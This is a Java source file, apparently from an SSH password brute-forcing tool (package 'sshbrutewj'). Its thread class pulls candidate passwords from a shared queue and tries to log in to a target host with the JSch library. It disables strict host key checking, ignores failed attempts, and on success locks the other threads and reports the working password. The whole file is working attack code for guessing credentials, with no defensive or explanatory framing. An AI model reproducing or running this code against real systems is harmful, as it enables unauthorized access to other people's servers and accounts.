package solirs.sshbrutewj;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

public class SSHThread extends Thread {
    private JSch jsch = new JSch();

    public void attemptConnection(String password) throws JSchException {
        Session session = jsch.getSession(ProgramSettings.username, ProgramSettings.ip, ProgramSettings.port);
        session.setTimeout(ProgramSettings.timeout);
        session.setPassword(password);
        session.connect();
    }

    public void run() {
        jsch.setConfig("StrictHostKeyChecking", "no");
        while (!ProgramSettings.queue.isEmpty()) {
            String password = ProgramSettings.queue.remove();
            try {
                attemptConnection(password);
                // password correct
                Main.lockAllThreads();
                Main.onPasswordCorrect(password);
            } catch (JSchException e) {
                continue;
            }
        }
    }
}